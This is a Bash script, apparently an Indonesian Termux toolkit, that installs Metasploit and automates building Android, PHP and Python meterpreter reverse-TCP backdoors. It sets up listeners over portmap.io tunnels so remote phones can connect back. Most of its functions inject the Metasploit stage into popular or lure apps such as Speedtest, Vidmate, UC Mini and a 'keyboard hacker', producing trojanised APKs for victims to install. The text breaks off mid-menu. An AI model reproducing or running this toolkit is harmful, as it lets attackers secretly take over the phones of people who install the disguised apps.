#!/bin/bash
#variable warna
#gunakan script ini dengan bijak
#created by K1M4K-ID
#github : https://github.com/K1M4K-ID
#thanks to : E99 & Gafar Rizky
#terimakasih
#recode tidak akan membuat mu bisa menjadi seorang programer

me="\033[31;1m"
hi="\033[32;1m"
ku="\033[33;1m"
bi="\033[34;1m"
un="\033[35;1m"
cy="\033[36;1m"
pu="\033[37;1m"

clear

awal(){
echo $bi
banner
sleep 0.01
echo $hi"[1]$ku Install Bahan";
sleep 0.01
echo $hi"[2]$ku Sudah Install";
sleep 0.01
echo $hi"[3]$ku Updates Script";
sleep 0.01
echo $hi"[4]$ku Contact Person";
sleep 0.01
echo $hi"[0]$ku exit";
sleep 0.01
echo $hi
read -p "masukan pilihan : " pilih
}

ulang(){
ulang="s"
while [ $ulang = "s" ];
do
	sleep 0.01
done
}

banner(){
echo """
              ███╗   ███╗███████╗███████╗
              ████╗ ████║██╔════╝██╔════╝
              ██╔████╔██║███████╗█████╗
              ██║╚██╔╝██║╚════██║██╔══╝
              ██║ ╚═╝ ██║███████║██║
              ╚═╝     ╚═╝╚══════╝╚═╝
        ██╗  ██╗██╗███╗   ███╗ █████╗ ██╗  ██╗
        ██║ ██╔╝██║████╗ ████║██╔══██╗██║ ██╔╝
        █████╔╝ ██║██╔████╔██║███████║█████╔╝
        ██╔═██╗ ██║██║╚██╔╝██║██╔══██║██╔═██╗
        ██║  ██╗██║██║ ╚═╝ ██║██║  ██║██║  ██╗
        ╚═╝  ╚═╝╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝
$bi"————————————————————————————————————————————————————"
$me"Author"     ":"    	              $pu"K1M4K-ID"
$me"Thanks To"  ":"	                  $pu"E99" | "Gafar Rizky"
$me"Youtube"    ":"	                  $pu"Fadillah Ramadhan"
"""
}

log(){
echo """
            ███████╗██╗  ██╗██╗████████╗
            ██╔════╝╚██╗██╔╝██║╚══██╔══╝
            █████╗   ╚███╔╝ ██║   ██║
            ██╔══╝   ██╔██╗ ██║   ██║
            ███████╗██╔╝ ██╗██║   ██║
            ╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝
                  $ku "TERIMA KASIH"
                $me "code:By-K1M4K-ID"
"""
}

_satu(){
echo $cy
clear
banner
echo
echo $hi"[+]$ku installing.."
echo
termux-setup-storage
mkdir Malware
apt update && apt upgrade -y
apt install git nano curl python python2 php ruby toilet figlet openssh clang -y
apt install -f -y
gem install lolcat
dpkg -i apktool.deb
echo
echo "----------------------------------------------------";
echo $hi"[+]$ku installing sukses"
echo
sleep 5
clear
read -p "[+] enter untuk membuat akun portmap.io" y
xdg-open https://portmap.io/
read -p "[+] tekan enter untuk install openvpn" y
xdg-open https://play.google.com/store/apps/details?id=net.openvpn.openvpn
read -p "[+] tekan enter untuk install apksigner" y
xdg-open https://play.google.com/store/apps/details?id=com.haibison.apksigner
cp -r K1M4K.first.ovpn /sdcard
echo $cy
clear
fungsi
}

_dua(){
echo $ku
clear
banner
echo $hi"[1]$cy install metasploit"
sleep 0.01
echo $hi"[2]$cy buat backdoor otomatis"
sleep 0.01
echo $hi"[3]$cy exploit metasploit"
sleep 0.01
echo $hi"[4]$cy update scripts"
sleep 0.01
echo $hi"[5]$cy exit"
sleep 0.01
echo
read -p "masukan pilihan : " pi
}

_tiga(){
echo $un
clear
banner
echo
echo $bi"----------------------------------------------------";
echo
git stash && git pull origin master
echo
echo $hi"[+]$ku update selesai.."
sleep 5
clear
fungsi
}

_empat(){
echo $me
clear
banner
echo $hi"[!] S U B S C R I B E..!!"
sleep 2
xdg-open https://www.youtube.com/channel/UCsevJlIs2MYo_-rJuDtFqUw
clear
read -p "[+] enter untuk bergabung grub whatsapps" y
sleep 2
xdg-open https://chat.whatsapp.com/I0WwbcKhdbEBL56WMvcPSI
read -p "[+] kembali" y
clear
fungsi
}

_andro_lima(){
echo $bi
clear
banner
echo "installing.."
sleep 3
echo
apt update && apt upgrade -y
apt install git curl wget nano -y
curl -LO https://github.com/termux/termux-packages/files/3995119/metasploit_5.0.65-1_all.deb.gz
gunzip metasploit_5.0.65-1_all.deb.gz
dpkg -i metasploit_5.0.65-1_all.deb
apt install -f
apt --fix-broken install
echo
echo $hi"[+]$ku sukses"
echo "----------------------------------------------------";
clear
_pill
}

_andro_tujuh(){
echo $me
clear
banner
echo "installing.."
echo
apt update && apt upgrade -y
apt install unstable-repo -y
apt install metasploit -y
echo
echo $hi"[+]$ku sukses.."
echo "----------------------------------------------------";
sleep 4
clear
_pill
}

back(){
clear
fungsi
}

iport(){
echo $ku
clear
mallware
echo $me"                  Satu Jaringan                     "
echo
echo $ku"gunakan ip data seluler / wlan0, swlan0"
sleep 2
echo $me
set -- $(ifconfig rmnet0 |grep "inet")
echo $2
sleep 2
echo $ku"----------------------------------------------------";
echo
echo "ip satu jaringan wifi wlan0"
echo $me
set -- $(ifconfig wlan0 |grep "inet")
echo $2
echo $ku"----------------------------------------------------";
echo
echo "ip satu jaringan wifi swlan0"
echo $me
set -- $(ifconfig swlan0 |grep "inet")
echo $2
sleep 2
echo
echo
echo $cy"                     CONFIGS                       "
echo $cy"                  Beda Jaringan                    "
echo
echo $bi"----------------------------------------------------";
echo
echo $cy"      K1M4K-23035.portmap.io:23035 => 8888     "
echo
echo $cy"             K1M4K-23035.portmap.io            "
sleep 1
echo
echo
echo $bi"    setiap ip berbeda beda, sesuaikan ip anda"
echo "----------------------------------------------------";
echo $hi
read -p "masukan configs/ip lokal : " l
echo
sleep 2
clear
mallware
echo
sleep 0.01
echo "        port dari 4444/8888 satu jaringan     "
echo
sleep 0.01
echo "     port dari portmap 5 digit beda jaringan  "
sleep 0.01
echo $me
echo "----------------------------------------------------";
echo
echo $cy"       port backdoor satu jaringan =>$me 4444"
echo
echo $cy"      K1M4K-23035.portmap.io:$me 23035$cy => 8888"
echo $me
echo "----------------------------------------------------";
echo $hi
read -p "masukan port  : " p
sleep 1
echo
echo $hi"[+]$ku masukan nama backdoor contoh => wifihack"
echo $hi
read -p "nama backdoor : " backdoor
sleep 1
clear
}

ipsc(){
echo $bi
clear
mallware
echo $me"                  Satu Jaringan                     "
echo
echo $ku"gunakan ip data seluler / wlan0, swlan0"
sleep 2
echo $me
set -- $(ifconfig rmnet0 |grep "inet")
echo $2
sleep 2
echo $ku"----------------------------------------------------";
echo
echo "ip satu jaringan wifi wlan0"
echo $me
set -- $(ifconfig wlan0 |grep "inet")
echo $2
echo $ku"----------------------------------------------------";
echo
echo "ip satu jaringan wifi swlan0"
echo $me
set -- $(ifconfig swlan0 |grep "inet")
echo $2
sleep 2
echo
echo
echo $cy"                     CONFIGS                       "
echo $cy"                  Beda Jaringan                    "
echo
echo $bi"----------------------------------------------------";
echo
echo $cy"      K1M4K-23035.portmap.io:23035 => 8888     "
echo
echo $cy"             K1M4K-23035.portmap.io            "
sleep 1
echo
echo
echo $bi"    setiap ip berbeda beda, sesuaikan ip anda"
echo "----------------------------------------------------";
echo $hi
read -p "masukan configs/ip lokal : " l
echo
sleep 2
clear
mallware
echo
sleep 0.01
echo "        port dari 4444/8888 satu jaringan     "
echo
sleep 0.01
echo "     port dari portmap 5 digit beda jaringan  "
sleep 0.01
echo $me
echo "----------------------------------------------------";
echo
echo $cy"       port backdoor satu jaringan =>$me 4444"
echo
echo $cy"      K1M4K-23035.portmap.io:$me 23035$cy => 8888"
echo $me
echo "----------------------------------------------------";
echo $hi
read -p "masukan port  : " p
sleep 1
echo
echo $hi"[+]$ku masukan nama backdoor contoh => wifihack"
echo $hi
read -p "nama backdoor : " backdoor
sleep 1
clear
}

ipori(){
echo $me
clear
mallware
echo $me"                  Satu Jaringan                     "
echo
echo $ku"gunakan ip data seluler / wlan0, swlan0"
sleep 2
echo $me
set -- $(ifconfig rmnet0 |grep "inet")
echo $2
sleep 2
echo $ku"----------------------------------------------------";
echo
echo "ip satu jaringan wifi wlan0"
echo $me
set -- $(ifconfig wlan0 |grep "inet")
echo $2
echo $ku"----------------------------------------------------";
echo
echo "ip satu jaringan wifi swlan0"
echo $me
set -- $(ifconfig swlan0 |grep "inet")
echo $2
sleep 2
echo
echo
echo $cy"                     CONFIGS                       "
echo $cy"                  Beda Jaringan                    "
echo
echo $bi"----------------------------------------------------";
echo
echo $cy"      K1M4K-23035.portmap.io:23035 => 8888     "
echo
echo $cy"             K1M4K-23035.portmap.io            "
sleep 1
echo
echo
echo $bi"    setiap ip berbeda beda, sesuaikan ip anda"
echo "----------------------------------------------------";
echo $hi
read -p "masukan configs/ip lokal : " l
echo
sleep 2
clear
mallware
echo
sleep 0.01
echo "        port dari 4444/8888 satu jaringan     "
echo
sleep 0.01
echo "     port dari portmap 5 digit beda jaringan  "
sleep 0.01
echo $me
echo "----------------------------------------------------";
echo
echo $cy"       port backdoor satu jaringan =>$me 4444"
echo
echo $cy"      K1M4K-23035.portmap.io:$me 23035$cy => 8888"
echo $me
echo "----------------------------------------------------";
echo $hi
read -p "masukan port  : " p
sleep 1
echo $cy
clear
banner
echo $hi
echo "[+] GENERATE BACKDOOR"
sleep 1
echo "[+] PLEASE WAIT"
echo
msfvenom -p android/meterpreter/reverse_tcp LHOST=$l LPORT=$p -o Malware/payload.apk
echo
git clone https://github.com/K1M4K-ID/Payload
echo
sleep 2
clear
}

vps(){
echo $ku
clear
banner
echo $hi
read -p "[+] Enter Untuk Aktifkan OVPN" ys
am start --user 0 -n net.openvpn.openvpn/net.openvpn.unified.MainActivity
echo
read -p "[+] Enter Untuk Sign Ulang Backdoor" ys
am start --user 0 -n com.haibison.apksigner/app.activities.MainActivity
echo
read -p "[+] Exploit" ys
clear
banner
echo
sleep 0.01
echo $me"----------------------------------------------------";
sleep 0.01
echo $hi"                aktifasi database                   ";
sleep 0.01
echo $me"----------------------------------------------------";
sleep 0.01
echo 
sleep 6
pg_ctl -D $PREFIX/var/lib/postgresql start
echo
echo $hi"[+]$pu DATABASE CONNECTED"
sleep 0.01
echo $me"----------------------------------------------------";
sleep 6
}

ekseapk(){
echo $me
clear
banner
echo
echo $hi"[+]$pu ip tun0 untuk jarak jauh/beda jaringan"
sleep 3
echo $me"----------------------------------------------------";
echo
echo $hi"[+]$pu gunakan port dari portmap.io jarak jauh"
sleep 3
echo $me"----------------------------------------------------";
echo
echo $hi"[+]$pu ip lokal untuk satu jaringan (wifi)"
sleep 3
echo $me"----------------------------------------------------";
echo
echo $hi"[+]$pu port 4444/8888 backdoor satu jaringan$me"
sleep 3
clear
banner
echo $ku
echo "ip satu jaringan data seluler"
echo $me
set -- $(ifconfig rmnet0 |grep "inet")
echo $2
sleep 2
echo $ku"----------------------------------------------------";
echo
echo "ip satu jaringan swlan0"
echo $me
set -- $(ifconfig swlan0 |grep "inet")
echo $2
sleep 2
echo $ku"----------------------------------------------------";
echo
echo "ip satu jaringan wlan0"
echo $me
set -- $(ifconfig wlan0 |grep "inet")
echo $2
sleep 2
echo $ku"----------------------------------------------------";
echo
echo "ip tun0 jarak jauh (wajib aktifkan opvpn)"
echo $me
set -- $(ifconfig tun0 |grep "inet")
echo $2
sleep 2
echo $ku"----------------------------------------------------";
echo $hi
read -p "masukan ip tun0/ip lokal : " l
echo
sleep 0.01
echo $ku
clear
banner
echo
sleep 0.01
echo "        port dari 4444/8888 satu jaringan     "
echo
sleep 0.01
echo "     port dari portmap 5 digit beda jaringan  "
sleep 0.01
echo $me
echo "----------------------------------------------------";
echo
echo $cy"       port backdoor satu jaringan =>$me 4444"
echo
echo $cy"      K1M4K-23035.portmap.io: 23035 =>$me 8888"
echo $me
echo "----------------------------------------------------";
echo $hi
sleep 0.01
read -p "masukan port : " p
sleep 2
clear
echo $hi"[+] RUN Please Wait!!"
echo
msfconsole -x "use exploit/multi/handler;set payload android/meterpreter/reverse_tcp;set LHOST $l;set LPORT $p;exploit;"
clear
_pill
}

eksepy(){
echo $bi
clear
banner
echo
echo $hi"[+]$pu ip tune0 untuk jarak jauh atau beda jaringan"
sleep 3
echo $me"----------------------------------------------------";
echo
echo $hi"[+]$pu gunakan port dari portmap.io untuk jarak jauh"
sleep 3
echo $me"----------------------------------------------------";
echo
echo $hi"[+]$pu ip lokal untuk satu jaringan (wifi)"
sleep 3
echo $me"----------------------------------------------------";
echo
echo $hi"[+]$pu port 4444/8888 backdoor satu jaringan$bi"
sleep 3
clear
banner
echo $ku
echo "ip satu jaringan data seluler"
echo $me
set -- $(ifconfig rmnet0 |grep "inet")
echo $2
sleep 2
echo $ku"----------------------------------------------------";
echo
echo "ip satu jaringan swlan0"
echo $me
set -- $(ifconfig swlan0 |grep "inet")
echo $2
sleep 2
echo $ku"----------------------------------------------------";
echo
echo "ip satu jaringan wlan0"
echo $me
set -- $(ifconfig wlan0 |grep "inet")
echo $2
sleep 2
echo $ku"----------------------------------------------------";
echo
echo "ip tun0 jarak jauh (wajib aktifkan opvpn)"
echo $me
set -- $(ifconfig tun0 |grep "inet")
echo $2
sleep 2
echo $ku"----------------------------------------------------";
echo
echo "setiap ip berbeda beda, sesuaikan ip anda"
echo "----------------------------------------------------";
echo $hi
read -p "masukan ip tun0/ip lokal : " l
echo $hi
sleep 0.01
clear
banner
echo
sleep 0.01
echo "        port dari 4444/8888 satu jaringan     "
echo
sleep 0.01
echo "     port dari portmap 5 digit beda jaringan  "
sleep 0.01
echo $me
echo "----------------------------------------------------";
echo
echo $cy"       port backdoor satu jaringan =>$me 4444"
echo
echo $cy"      K1M4K-23035.portmap.io: 23035 =>$me 8888"
echo $me
echo "----------------------------------------------------";
echo $hi
sleep 0.01
read -p "masukan port : " p
sleep 2
clear
echo $hi"[+] RUN Please Wait!!"
echo
msfconsole -x "use exploit/multi/handler;set payload python/meterpreter/reverse_tcp;set LHOST $l;set LPORT $p;exploit;"
clear
_pill
}

eksephp(){
echo $cy
clear
banner
echo
echo $hi"[+]$pu ip tune0 untuk jarak jauh atau beda jaringan"
sleep 3
echo $me"----------------------------------------------------";
echo
echo $hi"[+]$pu gunakan port dari portmap.io untuk jarak jauh"
sleep 3
echo $me"----------------------------------------------------";
echo
echo $hi"[+]$pu ip lokal untuk satu jaringan (wifi)"
sleep 3
echo $me"----------------------------------------------------";
echo
echo $hi"[+]$pu port 4444/8888 backdoor satu jaringan$cy"
sleep 3
clear
banner
echo $ku
echo "ip satu jaringan data seluler"
echo $me
set -- $(ifconfig rmnet0 |grep "inet")
echo $2
sleep 2
echo $ku"----------------------------------------------------";
echo
echo "ip satu jaringan swlan0"
echo $me
set -- $(ifconfig swlan0 |grep "inet")
echo $2
sleep 2
echo $ku"----------------------------------------------------";
echo
echo "ip satu jaringan wlan0"
echo $me
set -- $(ifconfig wlan0 |grep "inet")
echo $2
sleep 2
echo $ku"----------------------------------------------------";
echo
echo "ip tun0 jarak jauh (wajib aktifkan opvpn)"
echo $me
set -- $(ifconfig tun0 |grep "inet")
echo $2
sleep 2
echo $ku"----------------------------------------------------";
echo
echo "setiap ip berbeda beda, sesuaikan ip anda"
echo "----------------------------------------------------";
echo $hi
read -p "masukan ip tun0/ip lokal : " l
echo $bi
sleep 0.01
clear
banner
echo
sleep 0.01
echo "        port dari 4444/8888 satu jaringan     "
echo
sleep 0.01
echo "     port dari portmap 5 digit beda jaringan  "
sleep 0.01
echo $me
echo "----------------------------------------------------";
echo
echo $cy"       port backdoor satu jaringan =>$me 4444"
echo
echo $cy"      K1M4K-23035.portmap.io: 23035 =>$me 8888"
echo $me
echo "----------------------------------------------------";
echo $hi
sleep 0.01
read -p "masukan port : " p
sleep 2
clear
echo $hi"[+] RUN Please Wait!!"
echo
msfconsole -x "use exploit/multi/handler;set payload php/meterpreter/reverse_tcp;set LHOST $l;set LPORT $p;exploit;"
clear
_pill
}


bsatu(){
echo $bi
clear
banner
sleep 1
echo $hi"[+]$ku Generate Backdoor"
sleep 1
echo $hi"[+]$ku Loading.."
sleep 1
echo
msfvenom -p android/meterpreter/reverse_tcp LHOST=$l LPORT=$p -o /sdcard/$backdoor.apk
echo $hi
echo "selesai"
echo "----------------------------------------------------";
sleep 7
_pill
}


spt(){
ipori
echo $me
clear
mallware
echo $hi"                  wait for 35 minutes            "
echo
cd && cd msfkit && cd Payload
mv -f speedtest.apk ../Malware && cd && cd msfkit && cd Malware
apktool d speedtest.apk -o speedtest && rm -fr speedtest.apk
apktool d payload.apk -o payload && rm -fr payload.apk && cd
cd msfkit/Malware && rm -fr speedtest/smali/com/metasploit/stage
mv -f payload/smali/com/metasploit/stage speedtest/smali/com/metasploit/stage && cd
cd msfkit/Malware && apktool b speedtest -o speedtest.apk && cd
cd msfkit/Malware && mv -f speedtest.apk /sdcard && cd
cd msfkit/Malware && rm -fr * && cd
cd msfkit && rm -fr Payload
echo $hi
echo "selesai"
echo "----------------------------------------------------";
sleep 7
_pill
}

kybrd(){
ipori
echo $me
clear
mallware
echo $hi"                  wait for 35 minutes            "
echo
cd && cd msfkit && cd Payload
mv -f keyboard_hacker.apk ../Malware && cd && cd msfkit && cd Malware
apktool d keyboard_hacker.apk -o keyboard && rm -fr keyboard_hacker.apk
apktool d payload.apk -o payload && rm -fr payload.apk && cd
cd msfkit/Malware && rm -fr keyboard/smali/com/metasploit/stage
mv -f payload/smali/com/metasploit/stage keyboard/smali/com/metasploit/stage && cd
cd msfkit/Malware && apktool b keyboard -o keyboard_hacker.apk && cd
cd msfkit/Malware && mv -f keyboard_hacker.apk /sdcard && cd
cd msfkit/Malware && rm -fr * && cd
cd msfkit && rm -fr Payload
echo $hi
echo "selesai"
echo "----------------------------------------------------";
sleep 7
_pill
}

ghck(){
ipori
echo $me
clear
mallware
echo $hi"                 wait for 35 minutes             ";
echo
cd && cd msfkit && cd Payload
mv -f G45_Hacking.apk ../Malware && cd && cd msfkit && cd Malware
apktool d G45_Hacking.apk -o G45Hacking && rm -fr G45_Hacking.apk
apktool d payload.apk -o payload && rm -fr payload.apk && cd
cd msfkit/Malware && rm -fr G45Hacking/smali/com/metasploit/stage
mv -f payload/smali/com/metasploit/stage G45Hacking/smali/com/metasploit/stage && cd
cd msfkit/Malware && apktool b G45Hacking -o G45_Hacking.apk && cd
cd msfkit/Malware && mv -f G45_Hacking.apk /sdcard && cd
cd msfkit/Malware && rm -fr * && cd
cd msfkit && rm -fr Payload
echo $hi
echo "selesai"
echo "----------------------------------------------------";
sleep 7
_pill
}


kylg(){
ipori
echo $me
clear
mallware
echo $hi"                  wait for 35 minutes            "
echo
cd && cd msfkit && cd Payload
mv -f keyloager.apk ../Malware && cd && cd msfkit && cd Malware
apktool d keyloager.apk -o keyloager && rm -fr keyloager.apk
apktool d payload.apk -o payload && rm -fr payload.apk && cd
cd msfkit/Malware && rm -fr keyloager/smali/com/metasploit/stage
mv -f payload/smali/com/metasploit/stage keyloager/smali/com/metasploit/stage && cd
cd msfkit/Malware && apktool b keyloager -o keyloager.apk && cd
cd msfkit/Malware && mv -f keyloager.apk /sdcard && cd
cd msfkit/Malware && rm -fr * && cd
cd msfkit && rm -fr Payload
echo $hi
echo "selesai"
echo "----------------------------------------------------";
sleep 7
_pill
}

wps(){
ipori
echo $me
clear
mallware
echo $hi"                  wait for 35 minutes            "
echo
cd && cd msfkit && cd Payload
mv -f wps_hack.apk ../Malware && cd && cd msfkit && cd Malware
apktool d wps_hack.apk -o wps_hack && rm -fr wps_hack.apk
apktool d payload.apk -o payload && rm -fr payload.apk && cd
cd msfkit/Malware && rm -fr wps_hack/smali/com/metasploit/stage
mv -f payload/smali/com/metasploit/stage wps_hack/smali/com/metasploit/stage && cd
cd msfkit/Malware && apktool b wps_hack -o wps_hack.apk && cd
cd msfkit/Malware && mv -f wps_hack.apk /sdcard && cd
cd msfkit/Malware && rm -fr * && cd
cd msfkit && rm -fr Payload
echo $hi
echo "selesai"
echo "----------------------------------------------------";
sleep 7
_pill
}

drd(){
ipori
echo $me
clear
mallware
echo $hi"                  wait for 35 minutes            "
echo
cd && cd msfkit && cd Payload
mv -f droid_sqli.apk ../Malware && cd && cd msfkit && cd Malware
apktool d droid_sqli.apk -o droid_sqli && rm -fr droid_sqli.apk
apktool d payload.apk -o payload && rm -fr payload.apk && cd
cd msfkit/Malware && rm -fr droid_sqli/smali/com/metasploit/stage
mv -f payload/smali/com/metasploit/stage droid_sqli/smali/com/metasploit/stage && cd
cd msfkit/Malware && apktool b droid_sqli -o droid_sqli.apk && cd
cd msfkit/Malware && mv -f speedtest.apk /sdcard && cd
cd msfkit/Malware && rm -fr * && cd
cd msfkit && rm -fr Payload
echo $hi
echo "selesai"
echo "----------------------------------------------------";
sleep 7
_pill
}

vdmt(){
ipori
echo $me
clear
mallware
echo $hi"                  wait for 35 minutes            "
echo
cd && cd msfkit && cd Payload
mv -f vidmate.apk ../Malware && cd && cd msfkit && cd Malware
apktool d vidmate.apk -o vidmate && rm -fr vidmate.apk
apktool d payload.apk -o payload && rm -fr payload.apk && cd
cd msfkit/Malware && rm -fr vidmate/smali/com/metasploit/stage
mv -f payload/smali/com/metasploit/stage vidmate/smali/com/metasploit/stage && cd
cd msfkit/Malware && apktool b vidmate -o vidmate.apk && cd
cd msfkit/Malware && mv -f vidmate.apk /sdcard && cd
cd msfkit/Malware && rm -fr * && cd
cd msfkit && rm -fr Payload
echo $hi
echo "selesai"
echo "----------------------------------------------------";
sleep 7
_pill
}

ucc(){
ipori
echo $me
clear
mallware
echo $hi"                  wait for 35 minutes            "
echo
cd && cd msfkit && cd Payload
mv -f uc.apk ../Malware && cd && cd msfkit && cd Malware
apktool d uc.apk -o uc && rm -fr uc.apk
apktool d payload.apk -o payload && rm -fr payload.apk && cd
cd msfkit/Malware && rm -fr uc/smali/com/metasploit/stage
mv -f payload/smali/com/metasploit/stage uc/smali/com/metasploit/stage && cd
cd msfkit/Malware && apktool b uc -o uc.apk && cd
cd msfkit/Malware && mv -f uc.apk /sdcard && cd
cd msfkit/Malware && rm -fr * && cd
cd msfkit && rm -fr Payload
echo $hi
echo "selesai"
echo "----------------------------------------------------";
sleep 7
_pill
}

lkd(){
ipori
echo $me
clear
mallware
echo $hi"                  wait for 35 minutes            "
echo
cd && cd msfkit && cd Payload
mv -f lk21.apk ../Malware && cd && cd msfkit && cd Malware
apktool d lk21.apk -o lk && rm -fr lk21.apk
apktool d payload.apk -o payload && rm -fr payload.apk && cd
cd msfkit/Malware && rm -fr lk/smali/com/metasploit/stage
mv -f payload/smali/com/metasploit/stage lk/smali/com/metasploit/stage && cd
cd msfkit/Malware && apktool b lk -o lk21.apk && cd
cd msfkit/Malware && mv -f lk21.apk /sdcard && cd
cd msfkit/Malware && rm -fr * && cd
cd msfkit && rm -fr Payload
echo $hi
echo "selesai"
echo "----------------------------------------------------";
sleep 7
_pill
}

xxi(){
ipori
echo $me
clear
mallware
echo $hi"                  wait for 35 minutes            "
echo
cd && cd msfkit && cd Payload
mv -f indoxxi.apk ../Malware && cd && cd msfkit && cd Malware
apktool d indoxxi.apk -o indo && rm -fr indoxxi.apk
apktool d payload.apk -o payload && rm -fr payload.apk && cd
cd msfkit/Malware && rm -fr indo/smali/com/metasploit/stage
mv -f payload/smali/com/metasploit/stage indo/smali/com/metasploit/stage && cd
cd msfkit/Malware && apktool b indo -o indoxxi.apk && cd
cd msfkit/Malware && mv -f indoxxi.apk /sdcard && cd
cd msfkit/Malware && rm -fr * && cd
cd msfkit && rm -fr Payload
echo $hi
echo "selesai"
echo "----------------------------------------------------";
sleep 7
_pill
}

dsn(){
ipori
echo $me
clear
mallware
echo $hi"                  wait for 35 minutes            "
echo
cd && cd msfkit && cd Payload
mv -f design.apk ../Malware && cd && cd msfkit && cd Malware
apktool d design.apk -o des && rm -fr design.apk
apktool d payload.apk -o payload && rm -fr payload.apk && cd
cd msfkit/Malware && rm -fr des/smali/com/metasploit/stage
mv -f payload/smali/com/metasploit/stage design/smali/com/metasploit/stage && cd
cd msfkit/Malware && apktool b des -o design.apk && cd
cd msfkit/Malware && mv -f design.apk /sdcard && cd
cd msfkit/Malware && rm -fr * && cd
cd msfkit && rm -fr Payload
echo $hi
echo "selesai"
echo "----------------------------------------------------";
sleep 7
_pill
}



bscphp(){
echo $me
clear
banner
sleep 1
echo $hi"[+]$ku Generate Backdoor"
sleep 1
echo $hi"[+]$ku Loading.."
sleep 1
echo
msfvenom -p php/meterpreter/reverse_tcp LHOST=$l LPORT=$p -o /sdcard/$backdoor.php
echo $hi
echo "selesai"
echo "----------------------------------------------------";
sleep 7
_pill
}

bscpy(){
echo $ku
clear
banner
sleep 1
echo $hi"[+]$ku Generate Backdoor"
sleep 1
echo $hi"[+]$ku Loading.."
sleep 1
echo
msfvenom -p python/meterpreter/reverse_tcp LHOST=$l LPORT=$p -o /sdcard/$backdoor.py
echo $hi
echo "selesai"
echo "----------------------------------------------------";
sleep 7
_pill
}

simon(){
ipori
echo $me
clear
mallware
echo "                    wait for 35 minutes              "
echo $cy
cd && cd msfkit && cd Payload
mv -f SiMontok.apk ../Malware && cd && cd msfkit && cd Malware
apktool d SiMontok.apk -o simontok && rm -fr SiMontok.apk
apktool d payload.apk -o payload && rm -fr payload.apk && cd
cd msfkit/Malware && rm -fr simontok/smali/com/metasploit/stage
mv -f payload/smali/com/metasploit/stage simontok/smali/com/metasploit/stage && cd
cd msfkit/Malware && apktool b simontok -o SimontokVIP.apk && cd
cd msfkit/Malware && mv -f SimontokVIP.apk /sdcard && cd
cd msfkit/Malware && rm -fr * && cd
cd msfkit && rm -fr Payload
echo $hi
echo "selesai"
echo "----------------------------------------------------";
sleep 7
_pill
}

bck(){
echo $me
clear
banner
echo $me"[1]$pu Backdoor Deffault     ";
sleep 0.01
echo $me"[2]$pu Backdoor Python       ";
sleep 0.01
echo $me"[3]$pu Backdoor PHP          ";
sleep 0.01
echo $me"[4]$pu Backdoor Original      ";
sleep 0.01
echo $me"[0]$pu Kembali               ";
echo $me
read -p "masukan pilihan : " pi
}

spy(){
ipori
echo $me
clear
mallware
echo $hi"                  wait for 35 minutes            "
echo
cd && cd msfkit && cd Payload
mv -f spyphone.apk ../Malware && cd && cd msfkit && cd Malware
apktool d spyphone.apk -o spyphone && rm -fr spyphone.apk
apktool d payload.apk -o payload && rm -fr payload.apk && cd
cd msfkit/Malware && rm -fr spyphone/smali/com/metasploit/stage
mv -f payload/smali/com/metasploit/stage spyphone/smali/com/metasploit/stage && cd
cd msfkit/Malware && apktool b spyphone -o spyphone.apk && cd
cd msfkit/Malware && mv -f spyphone.apk /sdcard && cd
cd msfkit/Malware && rm -fr * && cd
cd msfkit && rm -fr Payload
echo $hi
echo "selesai"
echo "----------------------------------------------------";
sleep 7
_pill
}

mlwr(){
echo $me
mallware
echo
echo $me"[1]$pu Shopee Pink         "      $me"[8] $pu Vidmate             " 
echo $me"[2]$pu Spyphone            "      $me"[9] $pu Uc Mini             " 
echo $me"[3]$pu Speedtest           "      --------------------
echo $me"[4]$pu Keyboard Hacker     "      $me"[10]$pu Layar Kaca21        "
echo $me"[5]$pu Keyloager           "      $me"[11]$pu Indoxxi Bioskop     "
echo $me"[6]$pu Wps Hack            "      $me"[12]$pu Design Aplikasi     "
echo $me"[7]$pu Droid Sqli          "	   $me"[13]$pu G45 Hacking         "
echo $me"[0]$pu kembali             "      
echo $me
read -p "masukan pilihan : " pi
}




inmeta(){
echo $hi
clear
banner
echo $me"[1]$bi android versi 5-6"
echo $me"[2]$bi android versi 7-10"
echo $me"[0]$bi kembali"
echo $pu
read -p "masukan pilihan : " pi
sleep 2
clear
}

eks(){
echo $un
clear
banner
echo $bi"[1]$me Exploit Aplikasi";
sleep 0.01
echo $bi"[2]$me Exploit Python  ";
sleep 0.01
echo $bi"[3]$me Exploit PHP     ";
sleep 0.01
echo $bi"[0]$me Kembali         ";
echo $bi
read -p "masukan pilihan : " pi
}

bori(){
mlwr
echo
if [ $pi = "1" ];
then
clear
simon

elif [ $pi = "2" ];
then
clear
spy

elif [ $pi = "3" ];
then
clear
spt

elif [ $pi = "4" ];
then
clear
kybrd

elif [ $pi = "5" ];
then
clear
kylg

elif [ $pi = "6" ];
then
clear
wps

elif [ $pi = "7" ];
then
clear
drd

elif [ $pi = "8" ];
then
clear
vdmt

elif [ $pi = "9" ];
then
clear
ucc

elif [ $pi = "10" ];
then
clear
lkd

elif [ $pi = "11" ];
then
clear
xxi

elif [ $pi = "12" ];
then
clear
dsn

elif [ $pi = "13" ];
then
clear
ghck

elif [ $pi = "0" ];
then
clear
_pill

else
clear
echo $me "masukan input yang benar.."
sleep 4
clear
bori

fi
}

mallware(){
echo """
 
             @@@@@@@@@@   @@@@@@  @@@
             @@! @@! @@! @@!  @@@ @@!
             @!! !!@ @!@ @!@!@!@! @!!
             !!: !!: !!:  !!! !!: !!!
             :  ::   : : : ::.: : :!!
       @@@  @@@  @@@  @@@@@@  @@@@@@@  @@@@@@@@ 
       @@!  @@!  @@! @@!  @@@ @@!  @@@ @@!  
       @!!  !!@  @!@ @!@!@!@! @!@!!@!  @!!!:!   
        !:  !!:  !!  !!:  !!! !!: :!!  !!:  
        ::.:  ::::   : :  :   : : : :: :: 
"----------------------------------------------------"
 """
}

_pill(){
_dua
if [ $pi = "1" ];
then
inmeta
            if [ $pi = "1" ];
            then
            clear
            echo $me
            _andro_lima
	    inmeta

            elif [ $pi = "2" ];
            then
            clear
            echo $bi
            _andro_tujuh
	    inmeta

            elif [ $pi = "0" ];
            then
            _pill


            else
            clear
            echo $me"masukan input yang benar.."
            sleep 3
            clear
            inmeta

            fi

elif [ $pi = "2" ];
then
bck
sleep 1
            if [ $pi = "1" ];
            then
            clear
            iport
            bsatu


            elif [ $pi = "2" ];
            then
            clear
            ipsc
            bscpy

            elif [ $pi = "3" ];
            then
            clear
            ipsc
            bscphp

            elif [ $pi = "4" ];
            then
            clear
            bori

            elif [ $pi = "0" ];
            then
            clear
            _pill
